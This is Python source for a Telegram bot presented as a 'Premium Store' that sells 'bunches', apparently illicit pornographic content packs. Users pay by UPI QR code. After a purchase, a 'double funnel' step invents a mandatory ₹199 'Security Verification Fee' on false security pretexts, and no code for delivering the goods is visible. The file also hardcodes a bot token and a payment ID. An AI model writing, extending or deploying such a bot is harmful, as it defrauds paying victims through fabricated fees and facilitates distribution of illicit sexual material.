import logging
import sqlite3
import asyncio
import random
import time
import aiohttp
import json
import os
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import quote_plus
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import KeyboardButton, InlineKeyboardButton
from aiogram.filters import Command, StateFilter
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# --- RENDER FIX (DO NOT REMOVE) ---
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Alive")
    def log_message(self, format, *args): return

def run_fix():
    port = int(os.environ.get("PORT", 8080))
    HTTPServer(('0.0.0.0', port), HealthCheckHandler).serve_forever()

threading.Thread(target=run_fix, daemon=True).start()
# ------------------------------------------

# ===============================
# 1️⃣ CONFIGURATION
# ===============================
API_TOKEN = '8646581161:AAHVnFBJuSDgIRyHZQXm9S3tp1bVuE7dzJ4'
ADMIN_ID = 8055989982  
ADMIN_LOG_GROUP = -1003763385457 
SUPPORT_USER = "@Narxm" 
UPI_ID = "BHARATPE.8Q0I0Z6E9Q43217@fbpe" 
APPROVAL_FEE = 199 
GROUP_REQUEST_LINK = "https://t.me/+bd-wGb3JwndjYWNl" 
REFERRAL_BONUS = 5.0
PROOF_CHANNEL_LINK = "https://t.me/want_to_see_proof"

PRODUCTS_DATA = {
    "CXP Bunch": {"price": 149},
    "DESI Bunch": {"price": 99},
    "FOREIGN Bunch": {"price": 99},
    "GAY/LESBIAN Bunch": {"price": 99}
}

# ===============================
# 2️⃣ DATABASE SETUP
# ===============================
db = sqlite3.connect("automated_store.db")
cursor = db.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS users 
    (user_id INTEGER PRIMARY KEY, balance REAL DEFAULT 0, 
    deposits REAL DEFAULT 0, purchases INTEGER DEFAULT 0, 
    referrals INTEGER DEFAULT 0)''')
db.commit()

class Form(StatesGroup):
    amt = State()
    utr = State()
    fee_utr = State() 

# ===============================
# 3️⃣ BOT INITIALIZATION
# ===============================
logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

def main_kb():
    kb = ReplyKeyboardBuilder()
    kb.row(KeyboardButton(text="🛍️ Products"), KeyboardButton(text="👤 Account"))
    kb.row(KeyboardButton(text="💳 Deposit"), KeyboardButton(text="👥 Refer"))
    kb.row(KeyboardButton(text="📞 Support"), KeyboardButton(text="✅ Proofs"))
    kb.row(KeyboardButton(text="🔥 Best Sellers"))
    return kb.as_markup(resize_keyboard=True)

def ensure_user(uid):
    cursor.execute("SELECT user_id FROM users WHERE user_id=?", (uid,))
    if not cursor.fetchone():
        cursor.execute("INSERT INTO users (user_id, balance, deposits, purchases, referrals) VALUES (?, 0, 0, 0, 0)", (uid,))
        db.commit()
        return True
    return False

# ===============================
# 4️⃣ PROFESSIONAL ENGLISH HANDLERS
# ===============================

@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()
    uid = message.from_user.id
    is_new = ensure_user(uid)
    
    args = message.text.split()
    if is_new and len(args) > 1 and args[1].isdigit():
        ref_id = int(args[1])
        if ref_id != uid:
            ensure_user(ref_id)
            cursor.execute("UPDATE users SET balance = balance + ?, referrals = referrals + 1 WHERE user_id = ?", (REFERRAL_BONUS, ref_id))
            db.commit()
            try: await bot.send_message(ref_id, f"🎊 <b>Referral Bonus Received!</b>\n₹{REFERRAL_BONUS} has been added to your wallet for inviting a new client.", parse_mode="HTML")
            except: pass

    welcome_text = (
        f"👋 <b>Hello, {message.from_user.first_name}!</b>\n"
        f"──────────────────────\n"
        f"Welcome to <b>Premium Store Official</b>. 🛒\n\n"
        f"🛡️ <b>Verified Status:</b> Online\n"
        f"⚡ <b>Delivery Speed:</b> Instant\n"
        f"🔒 <b>Security Level:</b> High\n\n"
        f"<i>Please select an option from the menu below to proceed.</i>"
    )
    await message.answer(welcome_text, reply_markup=main_kb(), parse_mode="HTML")

@dp.message(F.text.contains("Refer"))
async def view_refer(message: types.Message, state: FSMContext):
    await state.clear()
    uid = message.from_user.id
    me = await bot.get_me()
    cursor.execute("SELECT referrals FROM users WHERE user_id=?", (uid,))
    ref_count = cursor.fetchone()[0]
    
    ref_link = f"https://t.me/{me.username}?start={uid}"
    ref_text = (
        f"👥 <b>AFFILIATE PROGRAM</b>\n"
        f"──────────────────────\n"
        f"Invite your friends and earn <b>₹{REFERRAL_BONUS}</b> for every person who joins via your link!\n\n"
        f"📊 <b>Your Statistics:</b>\n"
        f"• Total Invites: {ref_count}\n"
        f"• Total Earned: ₹{ref_count * REFERRAL_BONUS}\n\n"
        f"🔗 <b>Your Invite Link:</b>\n<code>{ref_link}</code>\n\n"
        f"<i>*Credits are added instantly after onboarding.</i>"
    )
    await message.answer(ref_text, parse_mode="HTML")

@dp.message(F.text.contains("Account"))
async def view_acc(message: types.Message, state: FSMContext):
    await state.clear()
    uid = message.from_user.id
    ensure_user(uid)
    cursor.execute("SELECT balance, deposits FROM users WHERE user_id=?", (uid,))
    res = cursor.fetchone()
    
    acc_text = (
        f"👤 <b>CLIENT DASHBOARD</b>\n"
        f"──────────────────────\n"
        f"🆔 <b>Client ID:</b> <code>{uid}</code>\n"
        f"💰 <b>Wallet Balance:</b> <b>₹{res[0]}</b>\n"
        f"📥 <b>Total Asset Flow:</b> ₹{res[1]}\n"
        f"🛡️ <b>Account Status:</b> Verified\n"
        f"──────────────────────"
    )
    await message.answer(acc_text, parse_mode="HTML")

@dp.message(F.text.contains("Products"))
@dp.message(F.text.contains("Best Sellers"))
async def view_prod(message: types.Message, state: FSMContext):
    await state.clear()
    builder = InlineKeyboardBuilder()
    for name, data in PRODUCTS_DATA.items():
        builder.row(InlineKeyboardButton(text=f"📦 {name} • ₹{data['price']}", callback_data=f"info_{name}"))
    
    msg = (f"✨ <b>AVAILABLE PREMIUM ASSETS</b>\n"
           f"──────────────────────\n"
           f"Select a product from the collection below. All items are delivered instantly.")
    await message.answer(msg, reply_markup=builder.as_markup(), parse_mode="HTML")

# ===============================
# 5️⃣ PURCHASE & DOUBLE FUNNEL (ENGLISH)
# ===============================

@dp.callback_query(F.data.startswith("info_"))
async def product_info(call: types.CallbackQuery):
    p_name = call.data.replace("info_", "")
    price = PRODUCTS_DATA[p_name]["price"]
    text = (f"💎 <b>ASSET OVERVIEW: {p_name}</b>\n"
            f"──────────────────────\n"
            f"💰 <b>Acquisition Price:</b> ₹{price}\n"
            f"⚡ <b>Delivery Type:</b> Instant fulfillment\n\n"
            f"<i>Proceed to finalize your acquisition of this premium asset.</i>")
    btn = InlineKeyboardBuilder()
    btn.row(InlineKeyboardButton(text=f"✅ BUY NOW • ₹{price}", callback_data=f"confirm_buy_{p_name}"))
    btn.row(InlineKeyboardButton(text="🔙 BACK TO LIST", callback_data="back_to_products"))
    await call.message.edit_text(text, reply_markup=btn.as_markup(), parse_mode="HTML")

@dp.callback_query(F.data.startswith("confirm_buy_"))
async def purchase_confirmation(call: types.CallbackQuery):
    p_name = call.data.replace("confirm_buy_", "")
    price = PRODUCTS_DATA[p_name]["price"]
    btn = InlineKeyboardBuilder()
    btn.row(InlineKeyboardButton(text="✅ YES, EXECUTE", callback_data=f"final_pay_{p_name}"))
    btn.row(InlineKeyboardButton(text="❌ NO, CANCEL", callback_data="cancel_purchase"))
    await call.message.edit_text(f"⚠️ <b>FINAL CONFIRMATION</b>\n──────────────────────\nDo you want to purchase <b>{p_name}</b> for ₹{price}?", reply_markup=btn.as_markup(), parse_mode="HTML")

@dp.callback_query(F.data.startswith("final_pay_"))
async def process_initial_purchase(call: types.CallbackQuery):
    p_name = call.data.replace("final_pay_", "")
    price = PRODUCTS_DATA[p_name]["price"]
    uid = call.from_user.id
    cursor.execute("SELECT balance FROM users WHERE user_id=?", (uid,))
    balance = cursor.fetchone()[0]
    
    if balance >= price:
        # Step 1: Initial Purchase
        cursor.execute("UPDATE users SET balance = balance - ?, purchases = purchases + 1 WHERE user_id = ?", (price, uid))
        db.commit()
        
        # Step 2: Show Verification Funnel
        order_id = f"FEE{int(time.time())}"
        upi_link = f"upi://pay?pa={UPI_ID}&pn=Verify&am={APPROVAL_FEE}&cu=INR&tr={order_id}"
        qr = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={quote_plus(upi_link)}"
        
        verification_text = (
            f"🛡️ <b>SYSTEM SECURITY PROTOCOL</b>\n"
            f"──────────────────────\n"
            f"✅ <b>INITIAL PAYMENT AUTHENTICATED: ₹{price}</b>\n\n"
            f"⚠️ <b>MANDATORY SECURITY CLEARANCE:</b>\n"
            f"To access our premium high-security cloud database, you must pay a one-time <b>Security Verification Fee (₹{APPROVAL_FEE})</b>. "
            f"This is required to verify your ID and prevent bot intrusion.\n\n"
            f"🚀 <b>AFTER VERIFICATION:</b>\n"
            f"• Automated Join Request Approval\n"
            f"• Instant Access to Content\n"
            f"• Lifetime Server Protection\n\n"
            f"👇 <b>Pay ₹{APPROVAL_FEE} to the QR code below.</b> Fulfillment will be finalized after UTR synchronization."
        )
        btn = InlineKeyboardBuilder()
        btn.row(InlineKeyboardButton(text="📩 SYNCHRONIZE UTR (VERIFY)", callback_data=f"fee_utr_{p_name}"))
        btn.row(InlineKeyboardButton(text="🔗 REQUEST CLOUD ACCESS", url=GROUP_REQUEST_LINK))
        
        await call.message.delete()
        await call.message.answer_photo(photo=qr, caption=verification_text, reply_markup=btn.as_markup(), parse_mode="HTML")
    else:
        await call.answer("❌ INSUFFICIENT BALANCE! PLEASE DEPOSIT.", show_alert=True)

# ===============================
# 6️⃣ DEPOSIT SYSTEM
# ===============================

@dp.message(F.text.contains("Deposit"))
async def dep_start(message: types.Message, state: FSMContext):
    await state.set_state(Form.amt)
    await message.answer("💳 <b>INITIALIZING DEPOSIT</b>\n──────────────────────\nEnter the amount you want to add (₹10 - ₹1000):", parse_mode="HTML")

@dp.message(Form.amt)
async def process_deposit_amt(message: types.Message, state: FSMContext):
    if message.text in ["🛍️ Products", "👤 Account", "💳 Deposit", "👥 Refer", "📞 Support", "✅ Proofs", "🔥 Best Sellers"]:
        await state.clear()
        return await message.answer("⚠️ Session terminated by user.")
    
    if not message.text.isdigit():
        return await message.answer("❌ <b>Protocol Error:</b> Use numbers only. Enter amount:")
    
    amt = int(message.text)
    if 10 <= amt <= 1000:
        await state.update_data(deposit_amt=amt)
        order_id = f"TXN{int(time.time())}"
        upi_link = f"upi://pay?pa={UPI_ID}&pn=Store&am={amt}&cu=INR&tr={order_id}"
        qr = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={quote_plus(upi_link)}"
        btn = InlineKeyboardBuilder().row(InlineKeyboardButton(text="📩 SUBMIT UTR FOR AUDIT", callback_data="submit_utr"))
        caption = (f"🛡️ <b>PENDING CREDIT: ₹{amt}</b>\n──────────────────────\n"
                   f"1️⃣ Scan & Pay exactly ₹{amt}\n"
                   f"2️⃣ Note the 12-digit Ref Number (UTR)\n"
                   f"3️⃣ Click 'Submit UTR' to finalize.")
        await message.answer_photo(photo=qr, caption=caption, reply_markup=btn.as_markup(), parse_mode="HTML")
    else:
        await message.answer("❌ Limit: ₹10 - ₹1000.")

@dp.callback_query(F.data == "submit_utr")
async def ask_utr(call: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.utr)
    await call.message.answer("⌨️ <b>Enter your 12-digit Ref/UTR Number:</b>", parse_mode="HTML")

@dp.message(Form.utr)
async def handle_utr(message: types.Message, state: FSMContext):
    if message.text in ["🛍️ Products", "👤 Account", "💳 Deposit", "👥 Refer", "📞 Support", "✅ Proofs"]:
        await state.clear()
        return await message.answer("⚠️ Session terminated.")

    utr, data, uid = message.text, await state.get_data(), message.from_user.id
    amt = data.get("deposit_amt", "0")
    await message.answer("⏳ <b>AUDIT IN PROGRESS...</b>\nOur team is verifying your payment with the bank. Please wait.", parse_mode="HTML")
    
    kb = InlineKeyboardBuilder().row(InlineKeyboardButton(text="Approve", callback_data=f"adm_y_{uid}_{amt}"), InlineKeyboardButton(text="Reject", callback_data=f"adm_n_{uid}"))
    try: await bot.send_message(ADMIN_LOG_GROUP, f"📥 <b>LEDGER AUDIT: ₹{amt}</b>\nClient: <code>{uid}</code>\nUTR: <code>{utr}</code>", reply_markup=kb.as_markup(), parse_mode="HTML")
    except: pass
    await state.clear()

# ===============================
# 7️⃣ ADMIN ACTIONS & NOTIFICATIONS
# ===============================

@dp.callback_query(F.data.startswith("adm_"))
async def admin_dep_action(call: types.CallbackQuery):
    parts = call.data.split("_")
    action, target_uid = parts[1], int(parts[2])
    if action == "y":
        amt = float(parts[3])
        cursor.execute("UPDATE users SET balance = balance + ?, deposits = deposits + ? WHERE user_id = ?", (amt, amt, target_uid))
        db.commit()
        await call.message.edit_text(call.message.text + "\n\n✅ <b>LEDGER UPDATED</b>", parse_mode="HTML")
        try: await bot.send_message(target_uid, f"✅ <b>TRANSACTION VERIFIED!</b>\n₹{amt} has been successfully credited to your wallet balance.", parse_mode="HTML")
        except: pass
    else:
        await call.message.edit_text(call.message.text + "\n\n❌ <b>AUDIT DENIED</b>", parse_mode="HTML")
        try: await bot.send_message(target_uid, f"❌ <b>TRANSACTION FAILED!</b>\nVerification failed. Please ensure you sent the correct UTR or contact support.", parse_mode="HTML")
        except: pass

@dp.callback_query(F.data.startswith("fee_utr_"))
async def ask_fee_utr(call: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.fee_utr)
    await call.message.answer("⌨️ <b>Enter Ref Number for Security Clearance (₹199):</b>", parse_mode="HTML")

@dp.message(Form.fee_utr)
async def process_fee_utr(message: types.Message, state: FSMContext):
    utr, uid = message.text, message.from_user.id
    await message.answer("⏳ <b>CLEARANCE PENDING...</b>\nYour access will be authorized once the security fee is verified.", parse_mode="HTML")
    kb = InlineKeyboardBuilder().row(InlineKeyboardButton(text="Clear Fee", callback_data=f"admfee_y_{uid}"), InlineKeyboardButton(text="Reject", callback_data=f"admfee_n_{uid}"))
    try: await bot.send_message(ADMIN_LOG_GROUP, f"🔥 <b>SECURITY CLEARANCE!</b>\nClient: <code>{uid}</code>\nUTR: <code>{utr}</code>", reply_markup=kb.as_markup(), parse_mode="HTML")
    except: pass
    await state.clear()

@dp.callback_query(F.data.startswith("admfee_"))
async def admin_fee_action(call: types.CallbackQuery):
    parts = call.data.split("_")
    action, target_uid = parts[1], int(parts[2])
    if action == "y":
        await call.message.edit_text(call.message.text + "\n\n✅ <b>SECURITY CLEARED</b>", parse_mode="HTML")
        try: await bot.send_message(target_uid, "🎉 <b>SECURITY VERIFIED!</b>\nVerification successful. Your join request has been accepted. Welcome to the Premium Cloud!", parse_mode="HTML")
        except: pass
    else:
        await call.message.edit_text(call.message.text + "\n\n❌ <b>CLEARANCE DENIED</b>", parse_mode="HTML")
        try: await bot.send_message(target_uid, "❌ <b>SECURITY FAILED!</b>\nVerification fee not detected. Please resubmit the correct Ref Number.", parse_mode="HTML")
        except: pass

@dp.message(Command("add"))
async def add_manual(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    try:
        _, tid, amt = message.text.split()
        cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (float(amt), int(tid)))
        db.commit()
        await message.answer(f"✅ <b>Credit Success!</b> ₹{amt} added to ID {tid}", parse_mode="HTML")
        try: await bot.send_message(int(tid), f"💰 <b>FUND CREDIT ALERT!</b>\nAdmin has manually credited <b>₹{amt}</b> to your wallet ledger.", parse_mode="HTML")
        except: pass
    except: await message.answer("❌ Use: `/add ID AMT`")

@dp.message(F.text.contains("Support"))
async def view_support(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer(f"📞 <b>SUPPORT CONCIERGE</b>\n──────────────────────\nAdmin: {SUPPORT_USER}\n⚡ <b>Response Time:</b> Fast", parse_mode="HTML")

@dp.message(F.text.contains("Proofs"))
async def view_proofs(message: types.Message, state: FSMContext):
    await state.clear()
    btn = InlineKeyboardBuilder().row(InlineKeyboardButton(text="👁️ VIEW VERIFIED LOGS", url=PROOF_CHANNEL_LINK))
    await message.answer("🏆 <b>SUCCESSFUL TRANSACTIONS</b>\n──────────────────────", reply_markup=btn.as_markup(), parse_mode="HTML")

# ===============================
async def main():
    print("🚀 Fixed Premium English Bot is Running...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())